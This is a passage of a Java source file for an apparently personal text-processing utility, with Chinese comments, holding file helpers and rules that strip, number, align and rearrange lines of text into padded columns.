			BasicFileAttributes attr = basicview.readAttributes();
			return attr.creationTime().toMillis();
		} catch (Exception e) {
			e.printStackTrace();
			return fileItem.lastModified();
		}
	}

	static Long getFileModifyTime(File fileItem) {
		try {
			Path path = Paths.get(fileItem.getAbsolutePath());
			BasicFileAttributeView basicview = Files.getFileAttributeView(path, BasicFileAttributeView.class,
					LinkOption.NOFOLLOW_LINKS);
			BasicFileAttributes attr = basicview.readAttributes();
			return attr.lastModifiedTime().toMillis();
		} catch (Exception e) {
			e.printStackTrace();
			return fileItem.lastModified();
		}
	}

	static Long getFileCreateTime(String filePath) {
		File file = new File(filePath);
		try {
			Path path = Paths.get(filePath);
			BasicFileAttributeView basicview = Files.getFileAttributeView(path, BasicFileAttributeView.class,
					LinkOption.NOFOLLOW_LINKS);
			BasicFileAttributes attr = basicview.readAttributes();
			return attr.creationTime().toMillis();
		} catch (Exception e) {
			e.printStackTrace();
			return file.lastModified();
		}
	}

	public static String getFileNameNoPoint(File file) {
		return getFileNameNoPoint(file.getAbsolutePath());
	}

	public static String getFileTypeWithPoint(File file) {

		return getFileTypeWithPoint(file.getAbsolutePath());
	}

	public static String getFileNameNoPoint(String fileName) {
		String name = "";
		if (fileName.contains(".")) {
			name = fileName.substring(0, fileName.lastIndexOf(".")).trim().toLowerCase();
		} else {
			name = new String(fileName);
		}
		return name.toLowerCase().trim();
	}

	public static String getFileNameNoPointNoLowerCase(String fileName) {
		String name = "";
		if (fileName.contains(".")) {
			name = fileName.substring(0, fileName.lastIndexOf(".")).trim();
		} else {
			name = new String(fileName);
		}
		return name.trim();
	}

	public static String getFileTypeWithPoint(String fileName) {
		String name = "";
		if (fileName.contains(".")) {
			name = fileName.substring(fileName.lastIndexOf(".")).trim().toLowerCase();
		} else {
			name = "";
		}
		return name.toLowerCase().trim();
	}

	public static void openImageFile(File imageFile) {
		if (CUR_OS_TYPE == OS_TYPE.Windows) {
			try {
				Runtime.getRuntime().exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
						+ imageFile.getAbsolutePath());

			} catch (Exception e) {

			}
		}

	}

	public static void fileCopy(File origin, File target) {
		InputStream input = null;
		OutputStream output = null;
		int lengthSize;
		// 创建输入输出流对象
		try {
			input = new FileInputStream(origin);
			output = new FileOutputStream(target);
			// 获取文件长度
			try {
				lengthSize = input.available();
				// 创建缓存区域
				byte[] buffer = new byte[lengthSize];
				// 将文件中的数据写入缓存数组
				input.read(buffer);
				// 将缓存数组中的数据输出到文件
				output.write(buffer);

			} catch (IOException e) {

				e.printStackTrace();
			}

		} catch (Exception e) {

		} finally {
			if (input != null && output != null) {
				try {
					input.close(); // 关闭流
					output.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	static ArrayList<File> getAllSubDirFile(File rootPath) {
		ArrayList<File> allDirFile = new ArrayList<File>();
		Path curRootPath = Paths.get(rootPath.getAbsolutePath() + File.separator);
		try {
			Files.walkFileTree(curRootPath, new SimpleFileVisitor<Path>() {

				@Override
				public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
					allDirFile.add(dir.toFile());
					return super.postVisitDirectory(dir, exc);
				}

			});
		} catch (IOException e) {
			e.printStackTrace();
		}
		return allDirFile;
	}

	public static boolean isValidUrl_String(String urlString) {
		boolean flag = false;
		if (urlString.startsWith("http:")) {
			flag = true;
		} else if (urlString.startsWith("https:")) {
			flag = true;
		} else if (urlString.startsWith("www.")) {
			flag = true;
		}

		return flag;
	}

	public static boolean isValidUrl(String urlString) {
		boolean flag = false;
		long lo = System.currentTimeMillis();
		URL url;
		try {
			url = new URL(urlString);
			URLConnection co = url.openConnection();
			co.setConnectTimeout(5000);
			co.connect();
			flag = true;
			System.out.println("连接可用");
		} catch (Exception e1) {
			System.out.println("连接打不开!");
			url = null;
			flag = false;
		}

		return flag;
	}

	public static void main(String[] args) {

		initSystemInfo();

		initInputParams(args);

		I9_TextRuleOperation mI9_Object = new I9_TextRuleOperation();
		mI9_Object.InitRule();
		// 用户没有输入参数
		if (CUR_INPUT_3_ParamStrList.size() == 0 && !allowEmptyInputParam) {
			showTip( args);
			return;
		}

		// 默认的索引同时也被修改 没有获得 当前 适配的规则索引
		if (CUR_TYPE_INDEX <= 0 || CUR_TYPE_INDEX > CUR_RULE_LIST.size()) {
			showNoTypeTip(CUR_TYPE_INDEX);
			return;
		}

		System.out.println("Default_Selected_Index  = " + CUR_TYPE_INDEX);

		CUR_Selected_Rule = getRuleByIndex(CUR_TYPE_INDEX); // 获取用户选中的 规则

		// 让各个规则自己去检测 自己需要的参数是否得到满足 并自己提示 给出 1.当前cmd路径下的文件 2.typeIndex 字符串 3.之后的输入参数
		if (CUR_Selected_Rule == null
				|| !CUR_Selected_Rule.checkParamsOK(CUR_Dir_FILE, CUR_TYPE_2_ParamsStr, CUR_INPUT_3_ParamStrList)) {
			if (CUR_Selected_Rule != null) {
				CUR_Selected_Rule.showWrongMessage(); // 提示当前规则的错误信息
			}

			System.out.println("当前输入参数可能 不能拼接成一个文件! 请检查输入参数! CUR_Selected_Rule=" + CUR_TYPE_INDEX
					+ "  CUR_Selected_Rule=" + CUR_Selected_Rule);
			return;
		}



		if (!CUR_Dir_FILE.exists() || !CUR_Dir_FILE.isDirectory()) {
			System.out.println("当前执行替换逻辑的文件路径:" + CUR_Dir_1_PATH + "  不存在! ");
			return;
		}

		boolean isPreParam_For_Rule = isPreParamMatchRuleIndex(CUR_TYPE_INDEX,I9_PreParam_PropValue_List);
		if(isPreParam_For_Rule) {
			CUR_Selected_Rule.init_pre_params(I9_PreParam_PropValue_List);
		}else {
			System.out.println("当前 预置参数索引 与 选中的参数规则索引 不匹配  选中规则:"+CUR_TYPE_INDEX);
			System.out.println("预置参数列表:" + Arrays.toString(I9_PreParam_PropValue_List.toArray()));
		}

		/*
		 * if(!checkInputParamsOK()){ System.out.
		 * println("当前用户输入的格式错误   input=【类型_索引】  例如    html_1   html_2    html_3  ");
		 * return; }
		 */

		CUR_Selected_Rule.operationRule(CUR_INPUT_3_ParamStrList); // 传递参数列表 进行处理
		I9_Properties.getProperty(Default_Selected_Rule_Index_Key, "" + CUR_TYPE_INDEX);
		setProperity();

	}

	public static boolean isPreParamMatchRuleIndex(int  ruleIndex , ArrayList<String> preParamList) {
		boolean isMatch = true;
		if(preParamList == null | preParamList.size() == 0) {
			isMatch = false;
			return isMatch;
		}

		for (int i = 0; i < preParamList.size(); i++) {
			String pre_param_item = preParamList.get(i);
			boolean is_match_item_flag = false;
			//

			boolean isStartWithRuleIndx = pre_param_item.startsWith(ruleIndex+"_");

			String[]	 preparamArr = pre_param_item.split("_");
			boolean is3segment = false;
			if(preparamArr != null && preparamArr.length >= 3) {
				is3segment = true;
			}

			if(is3segment && isStartWithRuleIndx) {
				is_match_item_flag = true;
			}

			isMatch &= is_match_item_flag;

		}

		return isMatch;

	}


	public static int getImageHigh(File picture) {
		int high = 0;
		ImageIcon imageIcon = new ImageIcon(picture.getAbsolutePath());
		high = imageIcon.getIconHeight();

		return high;
	}

	public static int getImageWidth(File picture) {
		int width = 0;
		ImageIcon imageIcon = new ImageIcon(picture.getAbsolutePath());
		width = imageIcon.getIconWidth();
		return width;
	}

	// 对齐行的操作 主要处理从浏览器复制到的表格数据 不对齐
	ArrayList<String> duiqi_hang_Rule_5(ArrayList<String> originStrList) {
		if (originStrList == null)
			return null;
		ArrayList<String> fixedStrArr = new ArrayList<String>();
		for (int i = 0; i < originStrList.size(); i++) {
			String onrLineStr = originStrList.get(i).trim();
			if ("".equals(onrLineStr.trim())) {
				continue;
			}
			String onrLineStr_clearChinese = clearChinese(onrLineStr);
			fixedStrArr.add(onrLineStr_clearChinese);
		}
		System.out.println("═════════════" + "输入到文件的新内容 Begin 如下:" + "═════════════");
		for (int i = 0; i < fixedStrArr.size(); i++) {
			System.out.println(fixedStrArr.get(i));
		}
		System.out.println("═════════════" + "输入到文件的新内容 End" + "═════════════");

		return fixedStrArr;
	}

	ArrayList<String> clearChinese_Rule_4(ArrayList<String> originStrList) {
		if (originStrList == null)
			return null;
		ArrayList<String> fixedStrArr = new ArrayList<String>();
		for (int i = 0; i < originStrList.size(); i++) {
			String onrLineStr = originStrList.get(i).trim();
			if ("".equals(onrLineStr.trim())) {
				continue;
			}
			String onrLineStr_clearChinese = clearChinese(onrLineStr);
			fixedStrArr.add(onrLineStr_clearChinese);
		}
		System.out.println("═════════════" + "输入到文件的新内容 Begin 如下:" + "═════════════");
		for (int i = 0; i < fixedStrArr.size(); i++) {
			System.out.println(fixedStrArr.get(i));
		}
		System.out.println("═════════════" + "输入到文件的新内容 End" + "═════════════");

		return fixedStrArr;
	}

	ArrayList<String> addLineNumberChar_Rule_3(ArrayList<String> originStrList) {
		if (originStrList == null)
			return null;
		ArrayList<String> fixedStrArr = new ArrayList<String>();
		int lineNum = 1;
		for (int i = 0; i < originStrList.size(); i++) {
			String onrLineStr = originStrList.get(i).trim();
			if ("".equals(onrLineStr.trim())) {
				continue;
			}
			fixedStrArr.add(lineNum + " " + onrLineStr);
			lineNum++;
		}
		System.out.println("═════════════" + "输入到文件的新内容 Begin 如下:" + "═════════════");
		for (int i = 0; i < fixedStrArr.size(); i++) {
			System.out.println(fixedStrArr.get(i));
		}
		System.out.println("═════════════" + "输入到文件的新内容 End" + "═════════════");

		return fixedStrArr;
	}

	static ArrayList<String> clearOneBlankCharAsOneStr_Rule_2(ArrayList<String> originStrList) {
		if (originStrList == null)
			return null;
		ArrayList<String> fixedStrArr = new ArrayList<String>();
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < originStrList.size(); i++) {
			String onrLineStr = originStrList.get(i).trim();
			String curFixedLineStr = "";
			if ("".equals(onrLineStr.trim())) {
				continue;
			}
			if (onrLineStr.contains("\t")) {
				curFixedLineStr = (onrLineStr.split("\t")[0].trim());
			} else if (onrLineStr.contains(" ")) {
				curFixedLineStr = (onrLineStr.split(" ")[0].trim());
			} else {
				curFixedLineStr = (onrLineStr);
			}
			curFixedLineStr = curFixedLineStr.replace("\n", "");
			sb.append(curFixedLineStr + "=");
		}

		String allStr = sb.toString().trim();
		while (allStr.endsWith("=")) {
			allStr = allStr.substring(0, allStr.length() - 1);
		}
		fixedStrArr.add("《" + allStr + "》");
		System.out.println("═════════════" + "输入到文件的新内容 Begin 如下:" + "═════════════");
		System.out.println("《" + allStr + "》");
		System.out.println("═════════════" + "输入到文件的新内容 End" + "═════════════");

		return fixedStrArr;
	}

	static void NotePadOpenTargetFile(String absPath) {
		String commandNotead = "";
		if (CUR_OS_TYPE == OS_TYPE.Windows) {
			commandNotead = "cmd.exe /c start   Notepad++.exe " + absPath;
			execCMD(commandNotead);

		} else if (CUR_OS_TYPE == OS_TYPE.Linux) {
			commandNotead = " gedit " + absPath;
		} else if (CUR_OS_TYPE == OS_TYPE.MacOS) {
			commandNotead = "/Applications/UltraEdit  " + absPath;
			execute_Mac(commandNotead);
		}
	}

	ArrayList<String> clearOneBlankChar_Rule_1(ArrayList<String> originStrList) {
		if (originStrList == null)
			return null;
		ArrayList<String> fixedStrArr = new ArrayList<String>();
		for (int i = 0; i < originStrList.size(); i++) {
			String onrLineStr = originStrList.get(i).trim();
			if ("".equals(onrLineStr.trim())) {
				continue;
			}
			if (onrLineStr.contains("\t")) {
				fixedStrArr.add(onrLineStr.split("\t")[0].trim());
			} else if (onrLineStr.contains(" ")) {
				fixedStrArr.add(onrLineStr.split(" ")[0].trim());
			} else {
				fixedStrArr.add(onrLineStr);
			}
		}
		System.out.println("═════════════" + "输入到文件的新内容 Begin 如下:" + "═════════════");
		for (int i = 0; i < fixedStrArr.size(); i++) {
			System.out.println(fixedStrArr.get(i));
		}
		System.out.println("═════════════" + "输入到文件的新内容 End" + "═════════════");

		return fixedStrArr;
	}

	// 自动判断输入文件中的一行有多少列字符串
	public static int Rule5_NUM_ERERY_LINE_OLD = 0; // 输入1.txt文件原本的每行列数 限制条件为 NEW/OLD 是正整数
	public static int Rule5_NUM_ERERY_LINE_NEW = 0; // 输出2.txt 文件需要自定义的产生的每行列数

	public static final int Rule5_PADDING_COLOM = 5; // 填充padding的距离 每个列之间的间距
	public static final boolean Rule5_NEED_SORT = false; // 输出是否需要进行A-Z的排序 默认为false 默认为按照1.txt的读取顺序显示
	public static final boolean Rule5_DEBUG_LOG = true; // 是否打印Log标识

	public static String Rule5_SRC_FILE_NAME = "1.txt"; // 输入文件1.txt
	public static String Rule5_DES_FILE_NAME = "2.txt"; // 输出文件1.txt

	public static String[] Rule5_splitArr; // 读取输入 1.txt每行 原始的split返回值字符串数组
	public static String[] Rule5_retContentArr; // 读取输入 1.txt每行 原始的split返回值经过过滤规格过滤后的返回值字符串数组

	static String Rule5_Split_Str = " ";
	public static long Rule5_fileSumLines; // 输入文件1.txt 的总行数
	public static long Rule5_newSumLines; // 输出文件 2.txt 的总行数
	public static long Rule5_stringNumOfInput_Max; // 输入和输出文件中字符串的最大的个数

	public static int[] Rule5_item_Max_Length = new int[Rule5_NUM_ERERY_LINE_NEW]; // 在1.txt输入文件每个列中字符串的最大长度的数组 默认为0
	public static int[] Rule5_item_Max_Length_new = new int[Rule5_NUM_ERERY_LINE_NEW]; // 在2.txt文件中每个列的字符串最大长度
	// 不足的补充padding

	public static ArrayList<String> duiqi_Rule_5(File srcFile, File targetFile) {

//        String mFilePath = System.getProperties().getProperty("user.dir")+File.separator+"1.txt";

		Rule5_SRC_FILE_NAME = srcFile.getAbsolutePath();
		Rule5_DES_FILE_NAME = targetFile.getAbsolutePath();
		System.out.println("Rule5_DES_FILE_NAME =  " + Rule5_DES_FILE_NAME);

		getLineRow(srcFile); // 获得当前输入的数据统计
		if (Rule5_NUM_ERERY_LINE_NEW == 0 || Rule5_NUM_ERERY_LINE_OLD == 0) {
			System.out.println("当前文件的列数检测失败  程序以失败姿态退出！ ");
			return null;
		} else {
			Rule5_item_Max_Length = new int[Rule5_NUM_ERERY_LINE_NEW]; // 在1.txt输入文件每个列中字符串的最大长度的数组 默认为0
			Rule5_item_Max_Length_new = new int[Rule5_NUM_ERERY_LINE_NEW]; // 在2.txt文件中每个列的字符串最大长度 不足的补充padding
		}
		getLineNum(srcFile); // 获得当前输入的数据统计

		try {

			// 链表数组 包含的是上面 LinkedList<String[]> 中的每一个String，这些String已经排序排好了
			LinkedList<String> sortStringlist = getAllStringItemFromInput(srcFile);

			// 依据标识位 对 所有的String 进行排序
			sortStringlist = sortAllStringItemMethod(sortStringlist);

			// 链表数组 成员都是 每一行字符串进行split分割后产生的字符串数组 并且每个Item 对应的String[] 长度是
			// Rule5_NUM_ERERY_LINE_NEW
			LinkedList<String[]> list_StringArr = new LinkedList<String[]>();

			// 填充输入到2.txt中的字符串数组的List
			fill_List_StringArr(list_StringArr, sortStringlist);

			// list_StringArr.length 就是 2.txt输出文件的行数
			System.out.println("list_StringArr.length 输出文件  总行数:" + list_StringArr.size());

			// int[] Rule5_item_Max_Length 数组进行查找 找到每列最大的字符串长度
			getStringMaxLengthMethod(list_StringArr);

			// 创建2.txt 并填充数据
			return calcul_duiqi_Rule_5(list_StringArr);

		} catch (Exception e) {
			System.out.println(e.fillInStackTrace());
		}
		return null;

	}

	public static void fill_List_StringArr(LinkedList<String[]> list_StringArr, LinkedList<String> sortStringlist) {
		String[] newRow = new String[Rule5_NUM_ERERY_LINE_NEW];

		for (int i = 0; i < sortStringlist.size(); i++) {

			int index = i % Rule5_NUM_ERERY_LINE_NEW;
			if (index == 0 && i > 0) {
				list_StringArr.add(newRow);
				newRow = new String[Rule5_NUM_ERERY_LINE_NEW];
			}
			newRow[index] = sortStringlist.get(i);
		}
		if (!list_StringArr.contains(newRow)) {
			list_StringArr.add(newRow);
		}

	}

	// 对 list_StringArr 内容进行重新填充 到 LinkedList<String[]> list_StringArr
	public static void fixSortInStringArrList(LinkedList<String[]> list_StringArr, LinkedList<String> sortStringlist) {

		int num = 0;
		for (String[] item : list_StringArr) {

			for (int i = 0; i < item.length; i++) {
				if (num + i < sortStringlist.size()) {
					item[i] = sortStringlist.get(num + i);
				}
			}
			num = num + item.length;

		}

	}

	public static String[] getStringArr_From_EveryRow(String contentString, int num) {
		Rule5_retContentArr = new String[num];
		if (contentString != null && !"".equals(contentString)) {

			if (num == 1) {

				Rule5_splitArr = contentString.split(Rule5_Split_Str);
				Rule5_splitArr = makeEmptyOut(Rule5_splitArr); // 把数组中的空字符 完全剔除
				if (Rule5_splitArr.length > num) {

					String contentLine = Rule5_splitArr[0];
					String fixString = fixStringMethod(contentLine);
					Rule5_retContentArr[0] = fixString;
					if (Rule5_DEBUG_LOG)
						System.out.println("只读取每行第一个字符串 = " + Rule5_splitArr[0]);
				}

			}

			if (num == 2) {

				Rule5_splitArr = contentString.split(Rule5_Split_Str);
				Rule5_splitArr = makeEmptyOut(Rule5_splitArr); // 把数组中的空字符 完全剔除
				if (Rule5_splitArr.length > num) {
					Rule5_retContentArr[0] = Rule5_splitArr[0];
					Rule5_retContentArr[1] = Rule5_splitArr[Rule5_splitArr.length - 1];

				} else if (Rule5_splitArr.length == num) {
					Rule5_retContentArr[0] = Rule5_splitArr[0];
					Rule5_retContentArr[1] = Rule5_splitArr[1];
				}

			} else {
				Rule5_splitArr = contentString.split(Rule5_Split_Str);
				if (Rule5_DEBUG_LOG)
					System.out.println("行数大于等于3: 值为“+ num+ ”  切割长度为 Rule5_splitArr.length =" + Rule5_splitArr.length);
				Rule5_splitArr = makeEmptyOut(Rule5_splitArr); // 把数组中的空字符 完全剔除
				for (int x = 0; x < Rule5_splitArr.length; x++) {

					if (Rule5_DEBUG_LOG)
						System.out.println("index =" + x + "   content:" + Rule5_splitArr[x]);
					if (x == Rule5_splitArr.length - 1) {
						if (Rule5_DEBUG_LOG)
							System.out.println();
					}

				}

				if (Rule5_splitArr.length > num) {
					int i = 0;
					int j = 0;
					for (i = 0; i < num; i++) {

						Rule5_retContentArr[i] = Rule5_splitArr[i];

					}
				} else if (Rule5_splitArr.length == num) {
					for (int x = 0; x < Rule5_splitArr.length; x++) {

						Rule5_retContentArr[x] = Rule5_splitArr[x];

					}

				}

			}

		}
		if (Rule5_DEBUG_LOG) {
			for (String value : Rule5_retContentArr) {
				System.out.println("value = " + value);
			}
		}

		return Rule5_retContentArr;
	}

	public static String fixStringMethod(String contentString) {
		int length = contentString.length();
		// System.out.println("contentString1"+ contentString);
		if (contentString.contains("    ")) {
			contentString = contentString.split("    ")[0].trim();
		} else if (contentString.contains("\t")) {
			contentString = contentString.split("\t")[0].trim();
		}
		System.out.println("contentString2  =  " + contentString);
		return contentString;
	}

	public static String[] makeEmptyOut(String[] strArr) {
		String[] validStrArrRet = null;
		ArrayList<String> validStrArr = new ArrayList<String>();

		if (strArr != null) {

			for (String strItem : strArr) {
				if (strItem == null || "".equals(strItem.trim())) {
					continue;
				}
				validStrArr.add(strItem);
			}
		}

		if (validStrArr.size() > 0) {
			validStrArrRet = new String[validStrArr.size()];

			for (int x = 0; x < validStrArr.size(); x++) {
				validStrArrRet[x] = validStrArr.get(x).trim();
			}
		}
		return validStrArrRet;

	}

	public static boolean isArrEmpty(String[] strArr) {
		boolean flag = false;

		if (strArr != null) {
			int i = 0;
			for (i = 0; i < strArr.length; i++) {
				if (strArr[i] != null && "".equals(strArr[i])) {
					flag = true;
					break;
				}
			}
		} else {
			flag = true;
		}
		return flag;
	}

	public static boolean checkInsert(int i, int j) {
		boolean flag = false;
		if (Rule5_retContentArr != null && Rule5_splitArr != null && i < Rule5_retContentArr.length
				&& j < Rule5_splitArr.length) {
			if ("".equals(Rule5_retContentArr[i]) && !"".equals(Rule5_splitArr[j])) {
				flag = true;
			}
		}
		return flag;
	}

	public static LinkedList<String> getAllStringItemFromInput(File srcFile) {

		// 链表数组 包含的是上面 LinkedList<String[]> 中的每一个String，这些String已经排序排好了
		LinkedList<String> sortStringlist = new LinkedList<String>();

		try {

			BufferedReader txtBR = new BufferedReader(new InputStreamReader(new FileInputStream(srcFile), "utf-8"));

			String lineContentFirst = ""; // 读取到的输入文件 1.txt 的每一行字符串

			// 一次性读出所有的字符串String 然后再重新编排？
			while (lineContentFirst != null) {
				lineContentFirst = txtBR.readLine(); // 从1.txt中读取一行字符串出来
				if (lineContentFirst == null) { // 如果读取到的字符串为null 说明读取到了末尾了
					System.out.println("1.txt read to end!");
					break;
				}
				// 对读取到的每行字符串 进行分拆 得到每一个当前字符串分拆后的数组
				String[] arrStr = getStringArr_From_EveryRow(lineContentFirst, Rule5_NUM_ERERY_LINE_OLD);
				if (arrStr != null && arrStr.length == Rule5_NUM_ERERY_LINE_OLD) {

					for (String strItem : arrStr) {
						sortStringlist.add(strItem); // 包含了所有切分出来的字符串
					}
				}
			}

			txtBR.close();

		} catch (Exception e) {
			System.out.println(e.fillInStackTrace());
		}

		return sortStringlist;
	}

	public static LinkedList<String> sortAllStringItemMethod(LinkedList<String> sortStringlist) {

		// sortStringlist.size() 是 2.txt 输出中所有字符串的数量
//        System.out.println("sortStringlist.length :" + sortStringlist.size());
		if (Rule5_NEED_SORT) {
			sortStringlist.sort(new Comparator<String>() { // 对字符串进行排序使得 aA-zZ这样的排序
				@Override
				public int compare(String o1, String o2) {
					return o1.toLowerCase().compareTo(o2.toLowerCase());
				}
			});
		}

		// 打印排序后的字符串
		if (Rule5_DEBUG_LOG) {
			for (String sortItem : sortStringlist) {
				System.out.println("sortItem:" + sortItem);
			}
		}

		return sortStringlist;
	}

	public static void getLineRow(File srcFile) {
		try {

			BufferedReader txtBR = new BufferedReader(new InputStreamReader(new FileInputStream(srcFile), "utf-8"));
			System.out.println("Rule5_NUM_ERERY_LINE_OLD=" + Rule5_NUM_ERERY_LINE_OLD + "  Rule5_NUM_ERERY_LINE_NEW="
					+ Rule5_NUM_ERERY_LINE_NEW);
			String line = txtBR.readLine();
			int index = 1;
			int rowNum = 0;
			while (line == null) {

				line = txtBR.readLine();
			}

			while (line != null && line.trim().isEmpty()) {
				line = txtBR.readLine();

			}
			System.out.println("line[" + index + "] = " + line);
			index++;
			if (line != null) {
				String numRow[] = null;
				if (line.contains(" ") && !line.contains("\t")) {
					numRow = line.trim().split(" ");
					Rule5_Split_Str = " ";
				} else if (line.contains("\t")) {
					numRow = line.trim().split("\t");
					Rule5_Split_Str = "\t";
				}

				if (numRow != null) {
					for (int i = 0; i < numRow.length; i++) {
						System.out.println("row[" + i + "] = " + numRow[i]);
						if (numRow[i].trim().isEmpty()) {
							continue;
						}

						rowNum++;
					}
					System.out.println("rowNum = " + rowNum);

					Rule5_NUM_ERERY_LINE_OLD = rowNum;
					Rule5_NUM_ERERY_LINE_NEW = rowNum;

				}

			}

			System.out.println("Rule5_NUM_ERERY_LINE_OLD=" + Rule5_NUM_ERERY_LINE_OLD + "  Rule5_NUM_ERERY_LINE_NEW="
					+ Rule5_NUM_ERERY_LINE_NEW);
			txtBR.close();
		} catch (Exception e) {
			System.out.println(e.fillInStackTrace());
		}
	}

	public static void getLineNum(File srcFile) {
		try {

			BufferedReader txtBR = new BufferedReader(new InputStreamReader(new FileInputStream(srcFile), "utf-8"));

			Rule5_fileSumLines = txtBR.lines().count(); // 当前输入 1.txt的行数
			// 当前输入 1.txt 所包含该的String字符串最大的数量 也是输入文件2.txt最大的字符串数量

			Rule5_stringNumOfInput_Max = Rule5_fileSumLines * Rule5_NUM_ERERY_LINE_OLD;
			Rule5_newSumLines = (Rule5_stringNumOfInput_Max / Rule5_NUM_ERERY_LINE_NEW) + 1;
			System.out.println("old_txt_lines=" + Rule5_fileSumLines + "  Rule5_newSumLines=" + Rule5_newSumLines
					+ "   AllStringNum = " + Rule5_stringNumOfInput_Max);
			txtBR.close();
		} catch (Exception e) {
			System.out.println(e.fillInStackTrace());
		}
	}

	public static void getStringMaxLengthMethod(LinkedList<String[]> list_StringArr) {
		if (list_StringArr != null) {
			int num = 0;
			for (String[] item : list_StringArr) { // 计算出每列的最长的字符串的长度
				if (item == null) {
					if (Rule5_DEBUG_LOG)
						System.out.println("item == null");
					continue;
				}
				// System.out.println("item != null index:"+ (num++)
				// +"item.length="+item.length);
				for (int z = 0; z < item.length; z++) {
					if (item[z] == null) {
						if (Rule5_DEBUG_LOG)
							System.out.println("item[z] = null");
						continue;
					}

					if (item[z] != null && item[z].length() > Rule5_item_Max_Length[z]) {
						if (Rule5_DEBUG_LOG)
							System.out.println("item[z].length() = " + item[z].length());
//                             Rule5_item_Max_Length[z] = item[z].length();
						boolean isContainChinese = isContainChinese(item[z]);
						Rule5_item_Max_Length[z] = isContainChinese
								? getFramePaddingChineseLength(item[z]) + item[z].length()
								: item[z].length();

					}
				}

			}

			// 设置2.txt的每一列的长度值
			for (int itemContentLength = 0; itemContentLength < Rule5_item_Max_Length.length; itemContentLength++) {
				Rule5_item_Max_Length_new[itemContentLength] = Rule5_item_Max_Length[itemContentLength]
						+ Rule5_PADDING_COLOM; // 每一列的长度值最长值+1 避免内容重叠
				if (Rule5_DEBUG_LOG)
					System.out.println("Rule5_item_Max_Length_new_index:" + itemContentLength
							+ " Rule5_item_Max_Length_new_value:" + Rule5_item_Max_Length_new[itemContentLength]);
			}

		}

	}

	public static ArrayList<String> calcul_duiqi_Rule_5(LinkedList<String[]> list_StringArr) {
		ArrayList<String> contentList = new ArrayList<String>();
		try {

			// 2.txt的内容进行填充 list_StringArr 中 每一个String【] 是 2.txt 中的一行】
			for (String[] item : list_StringArr) {
				StringBuilder sb = new StringBuilder("");
				if (item == null) {
					if (Rule5_DEBUG_LOG)
						System.out.println("item == null");
					continue;
				}
				if (Rule5_DEBUG_LOG) {
					System.out.println("item != null  item.length=" + item.length);
					int index = 0;
					for (String str : item) {
						System.out.println("item[" + index + "] != null   " + "item[" + index + "]" + str);
						index++;
					}

				}
				for (int z = 0; z < item.length; z++) {
					if (item[z] == null) {
						continue;
					}

					int padding = Rule5_item_Max_Length_new[z] - getFramePaddingChineseLength(item[z]);
//                    int padding = Rule5_item_Max_Length_new[z] - item[z].length();
					String paddingStr = "";
					for (int paddingNum = 0; paddingNum < padding; paddingNum++) {
						paddingStr += " ";
					}
					String content = item[z] + paddingStr;
					sb.append(content);
				}
				contentList.add(sb.toString());
			}
		} catch (Exception e) {
			System.out.println(e.fillInStackTrace());
		}
		return contentList;
	}

	// Rule_5 对齐 End

	// Rule_6 Begin 竖排列 转为 横竖排列 1xn 转为 4x(n/4)
	public static String Rule6_SRC_FILE_NAME = "";
	// 实现对 竖屏的字符 添加为 横屏排列的字符
	public static int Rule6_rowItemMaxLength = 0; // 最大item的长度
	public static int Rule6_itemSpace = 5;

	public static final ArrayList<String> Rule6_SrcStringArr = new ArrayList<>(); // 源数据的每行数据

	public static final ArrayList<String> Rule6_DstStringArr = new ArrayList<>(); // 目的数据的每行数据

	public static ArrayList<String> ShuZhuangHang_PaiLie_Rule_6(File srcFIle) {

//        String mFilePath = System.getProperties().getProperty("user.dir") + File.separator + "1.txt";

		Rule6_SRC_FILE_NAME = srcFIle.getAbsolutePath();
		getSrcLineArray();
		getMaxItemLength();
		getDstLineArray();
		return getNewStringArr_Rule6();
	}

	public static void getMaxItemLength() {

		for (String item : Rule6_SrcStringArr) {

//            if (item.length() > Rule6_rowItemMaxLength) {
//                Rule6_rowItemMaxLength = item.length();
//                continue;
//            }

			if (getFrameChineseCount(item) > Rule6_rowItemMaxLength) {
				Rule6_rowItemMaxLength = getFramePaddingChineseLength(item);
				continue;
			}

			System.out.println("最大项item的长度:  Rule6_rowItemMaxLength =" + Rule6_rowItemMaxLength);
		}

	}

	public static ArrayList<String> getNewStringArr_Rule6() {
		ArrayList<String> newContent = new ArrayList<String>();
		for (String item : Rule6_DstStringArr) {
			if (!item.isEmpty()) {
				newContent.add(item);
			}
		}

		return newContent;
	}

	public static void getSrcLineArray() {
		try {

			BufferedReader txtBR = new BufferedReader(
					new InputStreamReader(new FileInputStream(new File(Rule6_SRC_FILE_NAME)), "utf-8"));
			String lineContentFirst = ""; // 读取到的输入文件 1.txt 的每一行字符串

			// 一次性读出所有的字符串String 然后再重新编排？
			while (lineContentFirst != null) {
				lineContentFirst = txtBR.readLine(); // 从1.txt中读取一行字符串出来
				if (lineContentFirst == null) { // 如果读取到的字符串为null 说明读取到了末尾了
					System.out.println("文件读取完全");
					break;
				}
				if (lineContentFirst != null && !lineContentFirst.isEmpty())
					Rule6_SrcStringArr.add(lineContentFirst.trim());
				// System.out.println("lineContentFirst = " + lineContentFirst);
			}

			txtBR.close();
		} catch (Exception e) {
			System.out.println(e.fillInStackTrace());
		}
	}

	public static void getDstLineArray() {

		String dstLineString = "";
		for (int i = 0; i < Rule6_SrcStringArr.size(); i++) {
			String item = Rule6_SrcStringArr.get(i).trim();
			String fixItem = fixItemString(item);
			dstLineString = dstLineString + fixItem;
			if ((i + 1) % Rule6_num_row == 0) {
				System.out.println("Rule6_num_row = " + Rule6_num_row);
				if (!dstLineString.trim().isEmpty()) {
					Rule6_DstStringArr.add(dstLineString.trim());
					System.out.println("dstLineString = " + dstLineString);
				}
				dstLineString = "";
			}
		}
		Rule6_DstStringArr.add(dstLineString.trim()); // 添加剩下的那些 item

	}

	public static String fixItemString(String item) {
		if (item == null) {
			System.out.println("当前行为空1！");
			return "";

		}
		if (item != null && item.isEmpty()) {

			System.out.println("当前行为空2！");
			return "";
		}
//        int fixSpace = Rule6_rowItemMaxLength - item.length();
		int fixSpace = Rule6_rowItemMaxLength - getFramePaddingChineseLength(item);
		String spaceString = "";
		for (int j = 0; j < fixSpace + Rule6_itemSpace; j++) {

			spaceString = spaceString + " ";
		}
		item = item + spaceString;
		System.out.println("item = " + item);
		return item;

	}
	// Rule_6 End 竖排列 转为 横竖排列 1xn 转为 4x(n/4)

